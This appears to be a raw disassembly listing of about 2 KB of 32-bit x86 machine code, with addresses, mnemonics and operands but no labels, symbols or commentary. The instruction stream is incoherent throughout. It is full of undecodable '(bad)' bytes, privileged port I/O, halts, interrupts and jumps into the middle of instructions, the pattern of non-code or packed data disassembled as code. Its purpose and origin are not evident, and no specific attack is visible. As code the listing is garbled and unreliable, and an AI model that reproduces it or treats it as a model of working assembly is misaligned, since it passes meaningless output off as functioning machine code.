  44642a:	sbb    DWORD PTR [edi+0x7d901d9a],edx
  446430:	inc    eax
  446431:	and    BYTE PTR ds:0xf7fa4757,dl
  446437:	(bad)  [edx+0xe00b345]
  44643d:	imul   eax,eax,0x8cd08f03
  446443:	and    al,BYTE PTR [edx-0x1d]
  446446:	loopne 0x4463e8
  446448:	retf   0x7a65
  44644b:	inc    eax
  44644c:	sbb    edi,DWORD PTR [eax+0x22]
  44644f:	jb     0x446441
  446451:	or     edx,esp
  446453:	aad    0xdc
  446455:	pop    edx
  446456:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446457:	stc    
  446458:	inc    eax
  446459:	pop    esp
  44645a:	xlat   BYTE PTR ds:[ebx]
  44645b:	lea    ecx,[edi+0x79a0dcb4]
  446461:	add    dl,dl
  446463:	sbb    BYTE PTR [ecx+0x66bd330d],dh
  446469:	stos   BYTE PTR es:[edi],al
  44646a:	pusha  
  44646b:	lds    ebx,FWORD PTR [ecx+0x15]
  44646e:	mov    al,ds:0xd5495af9
  446473:	aad    0xc4
  446475:	outs   dx,BYTE PTR ds:[esi]
  446476:	popf   
  446477:	or     ecx,DWORD PTR [ebp+0x4a]
  44647a:	sub    BYTE PTR [eax-0x79],al
  44647d:	iret   
  44647e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44647f:	push   esi
  446480:	(bad)  [edi+edi*8+0x7f]
  446484:	inc    edi
  446485:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446486:	xor    al,BYTE PTR [edi+0x12e662b8]
  44648c:	push   ebp
  44648d:	jb     0x4464f6
  44648f:	mov    ebp,0xc438f18e
  446494:	rcr    DWORD PTR [edx+0x7d],1
  446497:	xchg   esp,eax
  446498:	hlt    
  446499:	and    DWORD PTR [esi-0x60ace42c],ebx
  44649f:	in     eax,dx
  4464a0:	pop    esp
  4464a1:	inc    ecx
  4464a2:	in     eax,dx
  4464a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4464a4:	push   ebp
  4464a5:	in     eax,dx
  4464a6:	outs   dx,BYTE PTR ds:[esi]
  4464a7:	push   edi
  4464a8:	cmp    dl,BYTE PTR [edx+0x7ce94cc8]
  4464ae:	mov    eax,0x2a02a904
  4464b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4464b4:	xchg   edx,eax
  4464b5:	cmp    al,BYTE PTR [edx+0x3a]
  4464b8:	sbb    esi,DWORD PTR ds:0xfb89032f
  4464be:	je     0x4464a5
  4464c0:	fucomi st,st(2)
  4464c2:	add    cl,BYTE PTR [eax+0x40]
  4464c5:	add    ebx,esp
  4464c7:	jnp    0x446513
  4464c9:	repz clc 
  4464cb:	ss int 0x9d
  4464ce:	ins    DWORD PTR es:[edi],dx
  4464cf:	sbb    DWORD PTR [edx],edi
  4464d1:	cs and esp,esp
  4464d4:	dec    ecx
  4464d5:	fnstenv [esi-0x4bb9510b]
  4464db:	xor    BYTE PTR [ebp+0x6e402b85],dh
  4464e1:	or     DWORD PTR [edi+0x64b36193],esi
  4464e7:	mov    ch,0xf2
  4464e9:	adc    DWORD PTR [esi-0x62],0x4c6a80c5
  4464f0:	(bad)  
  4464f1:	cmp    ah,BYTE PTR [edx+ebx*8+0x701fa3a8]
  4464f8:	(bad)  
  4464f9:	xchg   edx,eax
  4464fa:	pusha  
  4464fb:	mov    DWORD PTR [edi-0x58],ebp
  4464fe:	outs   dx,BYTE PTR ds:[esi]
  4464ff:	push   edx
  446500:	cmp    ch,ah
  446502:	jne    0x4464af
  446504:	bound  esp,QWORD PTR [edx]
  446506:	jecxz  0x44648c
  446508:	xchg   ecx,eax
  446509:	ret    0xe84c
  44650c:	xlat   BYTE PTR ds:[ebx]
  44650d:	pop    eax
  44650e:	pop    ds
  44650f:	xor    eax,0x423b5e68
  446514:	dec    esi
  446515:	icebp  
  446516:	rcl    ebp,cl
  446518:	sbb    al,0x77
  44651a:	push   ebp
  44651b:	dec    edx
  44651c:	cli    
  44651d:	push   ecx
  44651e:	xchg   ecx,esi
  446520:	mov    ebp,ecx
  446522:	jnp    0x446599
  446524:	pop    ebp
  446525:	dec    edx
  446526:	dec    bx
  446528:	mov    eax,ds:0x2f28b405
  44652d:	xor    eax,DWORD PTR [ebp+0x754d6ed6]
  446533:	ins    DWORD PTR es:[edi],dx
  446534:	xor    esi,DWORD PTR [esi-0x49]
  446537:	aad    0x89
  446539:	imul   esi,DWORD PTR [ebp+0x738dac11],0x2b94895f
  446543:	inc    esp
  446544:	leave  
  446545:	mov    bh,0x80
  446547:	inc    eax
  446548:	mov    dl,0x91
  44654a:	outs   dx,BYTE PTR ds:[esi]
  44654b:	out    0x88,al
  44654d:	loop   0x44657a
  44654f:	xor    eax,0xd5842a78
  446554:	inc    eax
  446555:	das    
  446556:	dec    ebx
  446557:	mov    al,ds:0x20c0dd65
  44655c:	jb     0x446524
  44655e:	pop    ds
  44655f:	or     esp,DWORD PTR [ecx-0x1e00dfa7]
  446565:	mov    ecx,0x1df55c6d
  44656a:	pop    ds
  44656b:	pop    ss
  44656c:	push   ecx
  44656d:	cdq    
  44656e:	retf   0xdd2
  446571:	jnp    0x446592
  446573:	mov    esi,ebp
  446575:	cs jmp 0x66d4:0xbf01c620
  44657d:	push   eax
  44657e:	out    dx,eax
  44657f:	sub    al,0xf7
  446581:	jb     0x4465ba
  446583:	push   cs
  446584:	mov    BYTE PTR [ebp+0x67],al
  446587:	xchg   DWORD PTR [ebp-0x4cbf97b],ecx
  44658d:	add    eax,0xcb5588a8
  446592:	in     al,dx
  446593:	and    ebp,edi
  446595:	loopne 0x446614
  446597:	add    DWORD PTR [ebp-0x49],ebp
  44659a:	push   esp
  44659b:	push   esp
  44659c:	int3   
  44659d:	push   esi
  44659e:	jb     0x4465c5
  4465a0:	outs   dx,BYTE PTR ds:[esi]
  4465a1:	sbb    al,0xb8
  4465a3:	sbb    esp,ebx
  4465a5:	and    DWORD PTR [edi-0x70],ebx
  4465a8:	or     BYTE PTR [edi-0x2e],ah
  4465ab:	pop    eax
  4465ac:	mov    BYTE PTR [ecx+0x13455ade],dl
  4465b2:	mov    dh,0x4
  4465b4:	je     0x4465b7
  4465b6:	xor    al,0xde
  4465b8:	jmp    0x4efb:0x78ceede2
  4465bf:	dec    edi
  4465c0:	imul   ecx,eax,0x7ed5db60
  4465c6:	cwde   
  4465c7:	icebp  
  4465c8:	cmp    bl,dh
  4465ca:	not    esi
  4465cc:	cmp    al,0xa4
  4465ce:	nop
  4465cf:	and    eax,0xf4be9463
  4465d4:	pop    ebx
  4465d5:	pop    edx
  4465d6:	ins    BYTE PTR es:[edi],dx
  4465d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4465d8:	sub    DWORD PTR [eax-0x26],edi
  4465db:	mov    DWORD PTR [ecx],ebp
  4465dd:	pushf  
  4465de:	(bad)  
  4465e0:	inc    ecx
  4465e1:	sbb    eax,0xfb421522
  4465e6:	cmp    edx,DWORD PTR [ecx-0x22]
  4465e9:	js     0x44659c
  4465eb:	mov    dh,0x34
  4465ed:	retf   0x12c6
  4465f0:	repnz sbb edx,DWORD PTR [ecx+0x6035405]
  4465f7:	ja     0x446646
  4465f9:	dec    ebp
  4465fa:	into   
  4465fb:	lods   eax,DWORD PTR ds:[esi]
  4465fc:	outs   dx,BYTE PTR ds:[esi]
  4465fd:	add    esi,DWORD PTR [edx]
  4465ff:	ds xchg ebp,eax
  446601:	sub    DWORD PTR [ebp+0x1e31edf3],edi
  446607:	(bad)  
  446608:	fisub  WORD PTR [edi]
  44660a:	mov    eax,0x1a0a9e4e
  44660f:	pop    esi
  446610:	js     0x4465da
  446612:	pop    ds
  446613:	std    
  446614:	pop    edx
  446615:	push   esi
  446616:	cdq    
  446617:	fwait
  446618:	dec    ebx
  446619:	add    ch,BYTE PTR [edi]
  44661b:	fcomp  QWORD PTR [esi-0x32ecef5]
  446621:	jg     0x4465ac
  446623:	or     al,0xf6
  446625:	jbe    0x44661a
  446627:	in     al,0x8c
  446629:	imul   ebx,DWORD PTR [esi],0x26d83a91
  44662f:	and    bh,bl
  446631:	and    al,0xd
  446633:	pop    edx
  446634:	add    esp,DWORD PTR [esi+0x1f]
  446637:	shl    DWORD PTR [esi+0x27],cl
  44663a:	enter  0x8455,0x79
  44663e:	pusha  
  44663f:	mov    eax,DWORD PTR [edx]
  446641:	std    
  446642:	xor    DWORD PTR [edi+0x21],edi
  446645:	(bad)  
  446647:	inc    edx
  446648:	pop    ecx
  446649:	adc    DWORD PTR [esi+0x30],esp
  44664c:	add    eax,0x77e87cbb
  446651:	and    DWORD PTR [eax+0x2c49c72b],0x39
  446658:	mov    ebp,ecx
  44665a:	jg     0x44666c
  44665c:	mov    ds:0x634eef03,eax
  446661:	add    edi,eax
  446663:	fadd   st(1),st
  446665:	repnz and DWORD PTR [eax-0xb],0x3f
  44666a:	popf   
  44666b:	xchg   ebx,eax
  44666c:	mov    esi,0xe02cf02
  446671:	push   ebx
  446672:	in     al,dx
  446673:	inc    eax
  446674:	push   ecx
  446675:	sbb    eax,0x2e198f24
  44667a:	push   0x3e93286c
  44667f:	xchg   esp,eax
  446680:	adc    al,cl
  446682:	icebp  
  446683:	xlat   BYTE PTR ds:[ebx]
  446684:	out    dx,eax
  446685:	icebp  
  446686:	ins    BYTE PTR es:[edi],dx
  446687:	push   0xffffffe4
  446689:	arpl   si,ax
  44668b:	sar    BYTE PTR [ebx],cl
  44668d:	adc    al,0x7e
  44668f:	(bad)  
  446690:	rcl    BYTE PTR [edi+0x11],cl
  446693:	sub    ch,BYTE PTR [esi-0x4bd61d9]
  446699:	outs   dx,BYTE PTR ds:[esi]
  44669a:	mov    ch,BYTE PTR [edx-0x2e9f2e90]
  4466a0:	sbb    al,0x73
  4466a2:	xchg   dl,bl
  4466a4:	shl    BYTE PTR [esi+0x9],0xd4
  4466a8:	fidiv  DWORD PTR [edx-0x2bb695d6]
  4466ae:	(bad)  
  4466af:	data16 (bad) 
  4466b1:	fld1   
  4466b3:	pop    ebx
  4466b4:	dec    edi
  4466b5:	(bad)  
  4466b6:	mov    ds:0x391a6294,al
  4466bb:	aam    0xee
  4466bd:	lock pop edx
  4466bf:	xor    BYTE PTR [edx],dl
  4466c1:	add    BYTE PTR [ebp-0x36],0xf6
  4466c5:	lods   eax,DWORD PTR ds:[esi]
  4466c6:	ins    DWORD PTR es:[edi],dx
  4466c7:	aad    0xe
  4466c9:	mov    bh,BYTE PTR [edx-0x70067f5e]
  4466cf:	aad    0xfa
  4466d1:	je     0x4466cf
  4466d3:	add    eax,0x80f22374
  4466d8:	mov    ebx,ecx
  4466da:	test   DWORD PTR [ebx],0x9e5798c3
  4466e0:	popa   
  4466e1:	add    ebx,DWORD PTR [edx+0x64]
  4466e4:	mov    cl,0xd9
  4466e6:	sub    edi,ecx
  4466e8:	cmc    
  4466e9:	xor    cl,BYTE PTR [edi]
  4466eb:	pop    eax
  4466ec:	mov    BYTE PTR [edi],cl
  4466ee:	jae    0x4466b7
  4466f0:	imul   ebp,DWORD PTR [edx+0x2b58190],0x2c
  4466f7:	cdq    
  4466f8:	pop    ebx
  4466f9:	sbb    ah,bl
  4466fb:	fdivr  DWORD PTR [eax-0x23fc5243]
  446701:	int    0x57
  446703:	aam    0x1
  446705:	cmp    BYTE PTR [ebp+0x13],cl
  446708:	in     eax,dx
  446709:	ss pop ds
  44670b:	inc    edi
  44670c:	into   
  44670d:	repnz mov fs,WORD PTR [edx]
  446710:	mov    gs,WORD PTR [edi+esi*8-0x2c]
  446714:	or     BYTE PTR [eax+0x6bddcbd6],ah
  44671a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44671b:	fwait
  44671c:	xchg   DWORD PTR [ebp+0x72],ebp
  44671f:	ficom  DWORD PTR [ebx+0x16c9e0f5]
  446725:	mov    edx,0x94d999aa
  44672a:	sub    DWORD PTR [eax-0x3ff27d85],ebx
  446730:	test   DWORD PTR [ebx],esi
  446732:	shr    DWORD PTR [ebp+0x902a588],cl
  446738:	pop    ebp
  446739:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44673a:	jnp    0x4466dc
  44673c:	xchg   ebp,eax
  44673d:	dec    ecx
  44673e:	and    al,0xb7
  446740:	pop    esp
  446741:	sub    esi,0xffffffb6
  446744:	(bad)  
  446745:	xchg   ebp,eax
  446746:	push   edi
  446747:	sbb    al,0xf5
  446749:	inc    ebx
  44674a:	ds aam 0xce
  44674d:	or     al,0xb1
  44674f:	test   DWORD PTR [edi],0x50ddd6b5
  446755:	add    al,BYTE PTR [edx-0x3f]
  446758:	outs   dx,BYTE PTR ds:[esi]
  446759:	push   0xffffff82
  44675b:	iret   
  44675c:	xchg   esi,eax
  44675d:	sbb    BYTE PTR [eax],al
  44675f:	and    BYTE PTR [ebx+edx*1+0x4368dfc8],dl
  446766:	inc    eax
  446767:	mov    dl,0x4a
  446769:	ror    DWORD PTR [ecx-0x2b],cl
  44676c:	add    DWORD PTR [esi+0x1834a14f],ebp
  446772:	xor    ah,al
  446774:	mov    al,0x31
  446776:	pop    ebp
  446777:	je     0x446701
  446779:	xchg   edi,eax
  44677a:	xchg   esi,eax
  44677b:	mov    bl,0x2d
  44677d:	int3   
  44677e:	pop    eax
  44677f:	pop    edx
  446780:	and    ecx,DWORD PTR [esi-0x220679e1]
  446786:	jg     0x446757
  446788:	sub    ecx,DWORD PTR ds:0xfe11d10f
  44678e:	pop    ebx
  44678f:	pop    esi
  446790:	fld    DWORD PTR ds:0xba33556
  446796:	std    
  446797:	(bad)  
  446798:	sub    eax,0xabaac41c
  44679d:	fist   DWORD PTR [ebx]
  44679f:	sub    BYTE PTR [eax-0x67],0xbd
  4467a3:	ror    BYTE PTR [eax-0x5767bf95],1
  4467a9:	lods   al,BYTE PTR ds:[esi]
  4467aa:	jmp    0x907fdae9
  4467af:	test   eax,0x9d64969a
  4467b4:	in     al,0xb7
  4467b6:	adc    eax,0x89604a2a
  4467bb:	and    al,0x7f
  4467bd:	mov    ebx,DWORD PTR [ecx+0x25]
  4467c0:	xchg   edi,eax
  4467c1:	and    al,0xc
  4467c4:	popa   
  4467c5:	xor    BYTE PTR [edx],bh
  4467c7:	sub    edx,DWORD PTR [edx-0x714afa06]
  4467cd:	or     dh,ch
  4467cf:	scas   al,BYTE PTR es:[edi]
  4467d0:	dec    ecx
  4467d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4467d2:	sub    BYTE PTR [edi-0x33],cl
  4467d5:	sbb    eax,0xd60b871e
  4467da:	jg     0x4467ca
  4467dc:	mov    al,BYTE PTR [esp+ebx*8]
  4467df:	aam    0x9
  4467e1:	sahf   
  4467e2:	dec    ebp
  4467e3:	add    dl,BYTE PTR [esi-0x59]
  4467e6:	jne    0x44680d
  4467e8:	(bad)  
  4467e9:	loope  0x446788
  4467eb:	jno    0x4467e1
  4467ed:	into   
  4467ee:	push   ss
  4467ef:	push   edi
  4467f0:	ins    BYTE PTR es:[edi],dx
  4467f1:	int3   
  4467f2:	in     al,0xd4
  4467f4:	(bad)  
  4467f5:	pop    ecx
  4467f6:	mov    ebp,DWORD PTR [esi+0x657b1b74]
  4467fc:	mov    DWORD PTR [ecx-0x192e9c04],edx
  446802:	fisub  DWORD PTR [ebp+0x8]
  446805:	or     dh,BYTE PTR [esi]
  446807:	aam    0x3f
  446809:	mov    ecx,0xc58e0fa4
  44680e:	lds    edx,FWORD PTR [ebp-0x78]
  446811:	aad    0x3c
  446813:	jp     0x44683d
  446815:	stc    
  446816:	call   0x4477dfc
  44681b:	jbe    0x446882
  44681d:	xlat   BYTE PTR ds:[ebx]
  44681e:	jge    0x4467ed
  446820:	add    esp,DWORD PTR [edi+0x7c]
  446823:	mov    ch,0xf5
  446825:	or     eax,0x634054fd
  44682a:	sbb    DWORD PTR [esi+0xd],ecx
  44682d:	add    esi,DWORD PTR [eax+ecx*2]
  446830:	fcmovnbe st,st(2)
  446832:	and    al,0xaf
  446834:	mov    ds:0x367b7d5b,al
  446839:	test   eax,0xc71f3b42
  44683e:	loope  0x4467e3
  446840:	push   0x68c44b44
  446845:	inc    ebx
  446846:	push   0xeb3a6ed4
  44684b:	and    al,0x98
  44684d:	fild   QWORD PTR [ebx]
  44684f:	pop    ds
  446850:	mov    BYTE PTR [ebx],cl
  446852:	and    edx,DWORD PTR [edi]
  446854:	push   ecx
  446855:	pop    ds
  446856:	imul   eax,ebx,0x18
  446859:	add    ah,al
  44685b:	out    0x4a,eax
  44685d:	repz popa 
  44685f:	icebp  
  446860:	sbb    DWORD PTR [ecx-0xe1312e1],ecx
  446866:	jne    0x446822
  446868:	push   esp
  446869:	xor    edx,DWORD PTR [eax]
  44686b:	aam    0x99
  44686d:	xchg   edi,eax
  44686e:	xor    edx,DWORD PTR [ecx]
  446870:	outs   dx,DWORD PTR ds:[esi]
  446871:	push   ds
  446872:	ja     0x446882
  446874:	cli    
  446875:	dec    ecx
  446876:	sbb    cl,bl
  446878:	mov    ch,dl
  44687a:	fs mov ebp,0x774b0098
  446880:	or     BYTE PTR [edx+0x53],dh
  446883:	shl    BYTE PTR [ecx-0x29f166f],cl
  446889:	test   eax,0x4d5f22c0
  44688e:	push   ds
  44688f:	addr16 mov ds:0xbacb,eax
  446893:	pop    ebp
  446894:	mov    ds:0x31d4fdfc,al
  446899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44689a:	ins    DWORD PTR es:[edi],dx
  44689b:	pop    es
  44689c:	push   ecx
  44689d:	data16 sbb cl,BYTE PTR [ebp-0x2d1f1c77]
  4468a4:	ins    DWORD PTR es:[edi],dx
  4468a5:	cmp    esp,edx
  4468a7:	jg     0x446869
  4468a9:	add    eax,0x364726a0
  4468ae:	or     DWORD PTR [eax],ebp
  4468b0:	jmp    0x446924
  4468b2:	push   ds
  4468b3:	pop    ss
  4468b4:	mov    ch,0xf9
  4468b6:	aam    0x68
  4468b8:	je     0x4468c6
  4468ba:	cmp    eax,0x238aa0d6
  4468bf:	fadd   QWORD PTR [ecx+0x7c]
  4468c2:	je     0x446919
  4468c4:	imul   ecx,DWORD PTR [ebp+0xb880a26],0x22e9568d
  4468ce:	xchg   edi,eax
  4468cf:	or     eax,0x418ecb
  4468d4:	mov    ah,cl
  4468d6:	ins    BYTE PTR es:[edi],dx
  4468d7:	dec    esp
  4468d8:	or     cl,ah
  4468da:	aas    
  4468db:	or     al,0x19
  4468dd:	(bad)  
  4468df:	sbb    eax,0x14717903
  4468e4:	aam    0x4c
  4468e6:	pop    ebp
  4468e7:	add    ebx,DWORD PTR ds:0x16ef202
  4468ed:	add    DWORD PTR [esi],ecx
  4468ef:	in     al,dx
  4468f0:	and    al,al
  4468f2:	pop    ds
  4468f3:	scas   eax,DWORD PTR es:[edi]
  4468f4:	hlt    
  4468f5:	aas    
  4468f6:	mov    esp,0x49537387
  4468fb:	pop    ecx
  4468fc:	mov    bl,0x16
  4468fe:	ins    BYTE PTR es:[edi],dx
  4468ff:	push   es
  446900:	out    0x42,eax
  446902:	mov    ds:0x1a716bd6,al
  446907:	test   ebp,0xf4b5594d
  44690d:	push   0xffffff9f
  44690f:	ins    DWORD PTR es:[edi],dx
  446910:	addr16 in eax,dx
  446912:	lds    edx,FWORD PTR [ecx-0x3e]
  446915:	add    eax,0x6e0afbce
  44691a:	xor    esp,DWORD PTR [edx-0x78e0864b]
  446920:	mov    dh,0x96
  446922:	mov    ecx,0x61ce5faf
  446927:	faddp  st(5),st
  446929:	add    cl,BYTE PTR [eax+0x3b7f7351]
  44692f:	test   eax,0x9b60fb6d
  446934:	pop    esi
  446935:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446936:	mov    ch,0xca
  446938:	(bad)  
  446939:	mov    bh,0x52
  44693b:	sahf   
  44693c:	repnz mov esi,?
  44693f:	inc    edi
  446940:	mov    bl,bl
  446942:	lahf   
  446943:	rol    dh,0xe6
  446946:	fs add eax,0x10606988
  44694c:	and    esp,esi
  44694e:	inc    ecx
  44694f:	fiadd  WORD PTR [ecx+0x56]
  446952:	mov    esi,0x21d3493
  446957:	lea    ebp,ss:[edx-0x52]
  44695b:	in     al,0xb0
  44695d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44695e:	pusha  
  44695f:	mov    cl,0x68
  446961:	xchg   ebx,eax
  446962:	icebp  
  446963:	jno    0x446913
  446965:	mov    DWORD PTR [ebx-0x2c],esi
  446968:	inc    edi
  446969:	jmp    0xa3572132
  44696e:	push   0xffffffbc
  446970:	mov    DWORD PTR [ebx],ebx
  446972:	xor    BYTE PTR [ecx+0x35],dl
  446975:	xchg   ecx,eax
  446976:	shl    BYTE PTR [ecx+0x3a],1
  446979:	loope  0x446980
  44697b:	lahf   
  44697c:	xchg   edi,eax
  44697d:	je     0x446930
  44697f:	aam    0x8
  446981:	and    al,BYTE PTR [esi-0x79]
  446984:	cmp    al,0xc
  446986:	pop    ds
  446987:	aas    
  446988:	mov    ecx,0x64e2bbb9
  44698d:	xchg   BYTE PTR [edi-0x2c],dh
  446990:	xor    eax,0xb429701e
  446995:	sahf   
  446996:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446997:	sbb    eax,0xd84f3276
  44699c:	mov    BYTE PTR [edi+0x71],bh
  44699f:	outs   dx,BYTE PTR ds:[esi]
  4469a0:	sub    dl,cl
  4469a2:	pop    ecx
  4469a3:	stc    
  4469a4:	cwde   
  4469a5:	add    eax,0x8f65a2aa
  4469aa:	popa   
  4469ab:	inc    edi
  4469ac:	pop    edi
  4469ad:	out    dx,al
  4469ae:	xor    ebp,DWORD PTR [edi-0x78]
  4469b1:	cmc    
  4469b2:	push   ss
  4469b3:	inc    esi
  4469b4:	inc    edx
  4469b5:	cmp    BYTE PTR [ecx+0xf8b7efa],ch
  4469bb:	mov    cl,BYTE PTR [edx-0x10e979b2]
  4469c1:	(bad)  
  4469c2:	(bad)  
  4469c3:	adc    al,0xc1
  4469c5:	int3   
  4469c6:	pop    ds
  4469c7:	(bad)  
  4469c8:	xchg   esp,eax
  4469c9:	out    dx,eax
  4469ca:	repnz sbb BYTE PTR [esi],cl
  4469cd:	push   esi
  4469ce:	mov    ecx,0x72a117ba
  4469d3:	dec    eax
  4469d4:	or     BYTE PTR [ebx+0x5089df5d],bh
  4469da:	ins    DWORD PTR es:[edi],dx
  4469db:	and    edi,ebp
  4469dd:	push   ds
  4469de:	ins    DWORD PTR es:[edi],dx
  4469df:	fimul  WORD PTR [ebx]
  4469e1:	sub    BYTE PTR [ebp-0x57],dl
  4469e4:	pop    esp
  4469e5:	add    al,BYTE PTR [eax-0xde3a37b]
  4469eb:	adc    DWORD PTR [ebp-0x75],eax
  4469ee:	xchg   edx,eax
  4469ef:	jge    0x4469fb
  4469f1:	add    ecx,DWORD PTR [edx+0x3d]
  4469f4:	fmulp  st(7),st
  4469f6:	cmp    bh,BYTE PTR [edx-0x4]
  4469f9:	add    eax,0x20f86d8c
  4469fe:	mov    ch,0xb8
  446a00:	sahf   
  446a01:	test   eax,0xa143151f
  446a06:	stos   DWORD PTR es:[edi],eax
  446a07:	and    al,0x66
  446a09:	push   es
  446a0a:	xor    al,0xd7
  446a0c:	or     edi,0xffffffdf
  446a0f:	lahf   
  446a10:	sub    DWORD PTR [edi+ebp*4-0x71c4772e],ebx
  446a17:	jns    0x446a30
  446a19:	int3   
  446a1a:	mov    al,ds:0x6e6a9529
  446a1f:	leave  
  446a20:	push   esi
  446a21:	add    dl,BYTE PTR [esi-0xc]
  446a24:	add    BYTE PTR [ebp+0x52],dh
  446a27:	dec    ebx
  446a28:	mov    bh,0x7b
  446a2a:	jge    0x4469fc
  446a2c:	xchg   ebp,eax
  446a2d:	xchg   DWORD PTR [ebx+0x54],eax
  446a30:	push   0xf959af1c
  446a35:	add    dl,BYTE PTR [ebx+eiz*8+0x60]
  446a39:	loopne 0x446a97
  446a3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  446a3c:	xor    ebx,ebp
  446a3e:	or     eax,0x447881c
  446a43:	fs sub eax,0x44c1ca86
  446a49:	mov    dl,0xf3
  446a4b:	hlt    
  446a4c:	mov    BYTE PTR [ecx-0x5f458c73],al
  446a52:	bound  edi,QWORD PTR [edi+edi*2-0x68]
  446a56:	dec    edi
  446a57:	or     al,0x88
  446a59:	fisttp QWORD PTR [eax-0x5d6f18c0]
  446a5f:	pop    ebx
  446a60:	xor    al,0xc3
  446a62:	or     dl,bh
  446a64:	daa    
  446a65:	mov    edx,esi
  446a67:	xchg   esp,eax
  446a68:	outs   dx,BYTE PTR ds:[esi]
  446a69:	enter  0xff84,0x88
  446a6d:	mov    ebx,DWORD PTR [edx-0x36]
  446a70:	stos   DWORD PTR es:[edi],eax
  446a71:	xchg   DWORD PTR [ebx-0x738dbbce],ecx
  446a77:	mov    edx,0xbc421d88
  446a7c:	dec    edi
  446a7d:	cmp    ebp,DWORD PTR [edx-0x63]
  446a80:	mov    ss,WORD PTR ds:0xb89c579e
  446a86:	std    
  446a87:	inc    esp
  446a88:	je     0x446a35
  446a8a:	mov    ebp,0xa6d1f8d5
  446a8f:	and    dl,0x7a
  446a92:	cdq    
  446a93:	repz aam 0x43
  446a96:	leave  
  446a97:	inc    esp
  446a98:	mov    DWORD PTR [ebx+0x7ecc1609],edx
  446a9e:	shr    BYTE PTR [edx+0x1e2d3d02],1
  446aa4:	dec    ecx
  446aa5:	sbb    eax,0x92e89ea8
  446aaa:	mov    si,0x6148
  446aae:	pop    ss
  446aaf:	push   0xffffff89
  446ab1:	gs push 0x2b
  446ab4:	cld    
  446ab5:	add    al,0xab
  446ab7:	mov    dl,0xf8
  446ab9:	sub    DWORD PTR [ecx+esi*2+0x161e69fd],edx
  446ac0:	sbb    esi,eax
  446ac2:	xchg   BYTE PTR [edx+0x56fd1d89],ah
  446ac8:	inc    eax
  446ac9:	push   0xffffff91
  446acb:	sahf   
  446acc:	sar    ebp,0x99
  446acf:	pop    edx
  446ad0:	in     eax,0x1e
  446ad2:	sbb    eax,0xacc09334
  446ad7:	int3   
  446ad8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  446ad9:	add    dl,BYTE PTR [edx+edx*1+0x35]
  446add:	not    DWORD PTR [ebx]
  446adf:	xor    DWORD PTR [edi],esi
  446ae1:	das    
  446ae2:	dec    edi
  446ae3:	inc    eax
  446ae4:	mov    DWORD PTR [ecx-0x4d],esi
  446ae7:	xor    eax,0xc61bbbab
  446aec:	dec    eax
  446aed:	add    ah,BYTE PTR [edx]
  446aef:	pop    es
  446af0:	inc    esi
  446af1:	jns    0x446b60
  446af3:	sub    DWORD PTR [ebx-0x3a6ae05f],eax
  446af9:	gs lock pop ebx
  446afc:	fmul   st(0),st
  446afe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  446aff:	aad    0x5
  446b01:	jbe    0x446ac2
  446b03:	push   esi
  446b04:	lock pop eax
  446b06:	div    dl
  446b08:	mov    BYTE PTR [ebp+0x66532572],bh
  446b0e:	mov    esp,0xf6037108
  446b13:	jno    0x446b53
  446b15:	jb     0x446aa1
  446b17:	cmc    
  446b18:	mov    DWORD PTR [eax+eiz*2],ecx
  446b1b:	in     eax,0xb
  446b1d:	cmp    esp,DWORD PTR [edi+ebp*4-0x2b5f8f3c]
  446b24:	out    0xf3,al
  446b26:	and    ebx,edi
  446b28:	(bad)  
  446b29:	or     BYTE PTR [eax],cl
  446b2b:	cli    
  446b2c:	mov    BYTE PTR [ebx],dl
  446b2e:	daa    
  446b2f:	add    eax,0x8cbbe2a4
  446b34:	mov    es,WORD PTR [edx]
  446b36:	and    ax,0xcff0
  446b3a:	(bad)  
  446b3c:	add    BYTE PTR [ebx],al
  446b3e:	pop    ds
  446b3f:	jg     0x446b95
  446b41:	das    
  446b42:	and    cl,ah
  446b44:	les    edx,FWORD PTR ds:0xa2ef0f
  446b4a:	cmp    BYTE PTR [ebx+0x167e2c7b],bl
  446b50:	lods   eax,DWORD PTR ds:[esi]
  446b51:	(bad)
  446b54:	mov    bh,bl
  446b56:	outs   dx,DWORD PTR ds:[esi]
  446b57:	repz ret 0xc583
  446b5b:	(bad)  
  446b5c:	xor    BYTE PTR [ebp+0x375f15f],al
  446b62:	adc    BYTE PTR [ebx-0x4f756a83],cl
  446b68:	xor    BYTE PTR [ecx+0x1e],0x77
  446b6c:	inc    ecx
  446b6d:	push   ss
  446b6e:	in     eax,dx
  446b6f:	adc    eax,0xd3e04210
  446b74:	dec    edx
  446b75:	dec    esp
  446b76:	dec    esi
  446b77:	mov    ebx,0x7ade56ed
  446b7c:	lods   al,BYTE PTR ds:[esi]
  446b7d:	shl    BYTE PTR [eax+0x5f],cl
  446b80:	mov    edx,0xe832eb17
  446b85:	dec    ecx
  446b86:	mov    eax,0x9e915dd5
  446b8b:	add    ch,BYTE PTR [edx-0x33]
  446b8e:	dec    edx
  446b8f:	popf   
  446b90:	push   0xffffff8e
  446b92:	aaa    
  446b93:	xchg   DWORD PTR [ecx+0x7929d3c9],ecx
  446b99:	fs out dx,eax
  446b9b:	dec    ecx
  446b9c:	arpl   WORD PTR gs:[eax],bx
  446b9f:	(bad)  
  446ba0:	mov    al,0x93
  446ba2:	les    esp,FWORD PTR [esi-0x6eb68677]
  446ba8:	(bad)  
  446ba9:	mov    esp,0x5bd6b95
  446bae:	ins    BYTE PTR es:[edi],dx
  446baf:	clc    
  446bb0:	test   eax,0x643462e8
  446bb5:	mov    dl,0x1f
  446bb7:	mov    ch,0x13
  446bb9:	xchg   esp,eax
  446bba:	mov    ecx,0x1a45becf
  446bbf:	aam    0xf1
  446bc1:	sbb    eax,0xebda5a6c
